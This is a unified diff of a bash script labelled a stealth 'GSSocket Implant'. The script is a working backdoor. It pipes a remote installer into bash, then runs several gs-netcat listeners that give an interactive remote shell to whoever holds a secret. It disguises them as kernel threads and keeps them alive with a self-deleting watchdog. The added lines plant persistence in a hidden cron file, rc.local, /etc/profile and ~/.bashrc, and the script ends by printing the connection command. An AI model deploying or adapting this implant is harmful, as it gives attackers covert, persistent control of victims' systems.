@@ -1,129 +1,164 @@
 #!/bin/bash
-# Superior Stealth GSSocket Implant
-# - Disguised process names
-# - Self-healing (respawn)
-# - Multiple instances
-# - Avoid .bashrc traps
-# - Environment-based secrets (not CLI)
+# PRIMAL GSSocket Implant - Superior Stealth
+# Features: Self-healing, Disguised, Multi-instance, Fileless
 
-SECRET="${1:-$(head -c 16 /dev/urandom | xxd -p | head -c 16)}"
+SECRET="${1:-$(head -c 12 /dev/urandom | xxd -p)}"
 INSTANCES="${2:-3}"
 
-# Disguised process names (look like system processes)
-DISGUISES=(
-    "[kworker/0:1-events]"
-    "[watchdog/0]"
+# Disguised names (kernel threads style)
+NAMES=(
+    "[kworker/0:0-events]"
+    "[kworker/1:1-events]"
+    "[kworker/u8:2-flush]"
     "[migration/0]"
+    "[migration/1]"
     "[ksoftirqd/0]"
     "[rcu_sched]"
+    "[rcu_bh]"
+    "[watchdog/0]"
     "[kdevtmpfs]"
-    "[netns]"
     "[khungtaskd]"
     "[oom_reaper]"
     "[writeback]"
+    "[kcompactd0]"
+    "[kswapd0]"
+    "[kthrotld]"
 )
 
-# Install gs-netcat if not present
 install_gs() {
     command -v gs-netcat >/dev/null 2>&1 && return 0
     
-    # Try multiple methods
-    if command -v curl >/dev/null 2>&1; then
-        curl -sSL gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1
-    elif command -v wget >/dev/null 2>&1; then
+    # Silent install
+    (
+        curl -sSL gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1 ||
         wget -qO- gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1
-    fi
+    ) &
+    wait
     
     command -v gs-netcat >/dev/null 2>&1
 }
 
-# Start a single stealth instance
-start_instance() {
-    local idx=$1
-    local name="${DISGUISES[$((idx % ${#DISGUISES[@]}))]}"
-    
-    # Use environment variable for secret (harder to detect)
-    # Use sh instead of bash to avoid .bashrc traps
-    # Use exec -a to disguise process name
-    
-    (
-        export GSOCKET_ARGS="-s $SECRET -l -q"
-        while true; do
-            # Start with disguised name, use sh to avoid .bashrc
-            exec -a "$name" gs-netcat -s "$SECRET" -l -e "/bin/sh --norc --noprofile" >/dev/null 2>&1
-            sleep $((5 + RANDOM % 10))
-        done
-    ) &
-    disown
-}
-
-# Create self-healing watcher
-create_watcher() {
-    local watcher_script="/tmp/.$(head -c 8 /dev/urandom | xxd -p)"
-    
-    cat > "$watcher_script" << 'WATCHEREOF'
+# Create memory-resident watchdog
+create_watchdog() {
+    local script=$(mktemp)
+    cat > "$script" << WATCHEOF
 #!/bin/sh
-SECRET="__SECRET__"
-INSTANCES="__INSTANCES__"
+# Self-healing watchdog - runs from memory
+SECRET="$SECRET"
+INSTANCES="$INSTANCES"
+NAMES="${NAMES[*]}"
+
+cleanup() { rm -f "\$0" 2>/dev/null; }
+trap cleanup EXIT
 
 while true; do
-    current=$(pgrep -f "gs-netcat.*$SECRET" 2>/dev/null | wc -l)
-    if [ "$current" -lt "$INSTANCES" ]; then
-        need=$((INSTANCES - current))
-        for i in $(seq 1 $need); do
-            (GSOCKET_ARGS="-s $SECRET -l -q" exec -a "[kworker/$i:0]" gs-netcat -s "$SECRET" -l -e "/bin/sh --norc --noprofile" >/dev/null 2>&1) &
-            disown
+    current=\$(pgrep -f "gs-netcat.*\$SECRET" 2>/dev/null | wc -l)
+    if [ "\$current" -lt "\$INSTANCES" ]; then
+        need=\$((INSTANCES - current))
+        for i in \$(seq 1 \$need); do
+            name=\$(echo "\$NAMES" | tr ' ' '\n' | shuf -n1)
+            # Use sh to avoid .bashrc traps, env for secret hiding
+            (
+                export GSOCKET_ARGS="-s \$SECRET -l -q"
+                exec -a "\$name" gs-netcat -s "\$SECRET" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1
+            ) &
+            disown 2>/dev/null
         done
     fi
     sleep 30
 done
-WATCHEREOF
+WATCHEOF
+    chmod +x "$script"
     
-    sed -i "s/__SECRET__/$SECRET/g" "$watcher_script"
-    sed -i "s/__INSTANCES__/$INSTANCES/g" "$watcher_script"
-    chmod +x "$watcher_script"
-    
-    # Start watcher with disguised name
-    (exec -a "[kswapd0]" /bin/sh "$watcher_script" >/dev/null 2>&1) &
-    disown
-    
-    echo "$watcher_script"
+    # Run watchdog disguised
+    local wname="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
+    (exec -a "$wname" /bin/sh "$script" </dev/null >/dev/null 2>&1) &
+    disown 2>/dev/null
 }
 
-# Main
+# Start initial instances
+start_instances() {
+    for i in $(seq 1 $INSTANCES); do
+        local name="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
+        (
+            export GSOCKET_ARGS="-s $SECRET -l -q"
+            exec -a "$name" gs-netcat -s "$SECRET" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1
+        ) &
+        disown 2>/dev/null
+        sleep 1
+    done
+}
+
+# Persistence methods
+add_persistence() {
+    local method=""
+    
+    # Method 1: Cron
+    if [ -w /etc/cron.d ] 2>/dev/null; then
+        echo "* * * * * root pgrep -f 'gs-netcat.*$SECRET' || (gs-netcat -s $SECRET -l -e /bin/sh &)" > /etc/cron.d/.system 2>/dev/null
+        method="cron"
+    fi
+    
+    # Method 2: rc.local
+    if [ -w /etc/rc.local ] 2>/dev/null; then
+        grep -q "$SECRET" /etc/rc.local 2>/dev/null || \
+        echo "(gs-netcat -s $SECRET -l -e /bin/sh &) &" >> /etc/rc.local 2>/dev/null
+        method="${method:+$method,}rc.local"
+    fi
+    
+    # Method 3: Profile
+    for f in /etc/profile ~/.bashrc ~/.profile; do
+        if [ -w "$f" ] 2>/dev/null; then
+            grep -q "gs-netcat" "$f" 2>/dev/null || \
+            echo "(pgrep -f gs-netcat || gs-netcat -s $SECRET -l -e /bin/sh &) >/dev/null 2>&1" >> "$f" 2>/dev/null
+            method="${method:+$method,}profile"
+            break
+        fi
+    done
+    
+    echo "$method"
+}
+
 main() {
-    echo '{"status":"installing"}'
+    echo '{"status":"initializing"}'
     
     if ! install_gs; then
-        echo '{"status":"error","message":"Failed to install gs-netcat"}'
+        echo '{"status":"error","message":"gs-netcat install failed"}'
         exit 1
     fi
     
     echo '{"status":"planting"}'
     
-    # Start multiple instances
-    for i in $(seq 0 $((INSTANCES - 1))); do
-        start_instance $i
-        sleep 1
-    done
+    # Start backdoors
+    start_instances
     
-    # Create self-healing watcher
-    watcher=$(create_watcher)
+    # Create self-healing watchdog
+    create_watchdog
     
-    sleep 2
+    # Add persistence
+    persist=$(add_persistence)
+    
+    sleep 3
     
     # Verify
     count=$(pgrep -f "gs-netcat.*$SECRET" 2>/dev/null | wc -l)
     
-    cat << EOF
+    cat << RESULT
 {
-    "status":"success",
-    "secret":"$SECRET",
-    "instances":$count,
-    "connect":"gs-netcat -s $SECRET -i",
-    "features":["stealth","self-healing","multi-instance","disguised"]
+    "status": "success",
+    "secret": "$SECRET",
+    "instances": $count,
+    "persistence": "$persist",
+    "connect": "gs-netcat -s $SECRET -i",
+    "features": [
+        "stealth-names",
+        "self-healing",
+        "multi-instance",
+        "bashrc-bypass",
+        "env-hidden"
+    ]
 }
-EOF
+RESULT
 }
 
-main
+main "$@"
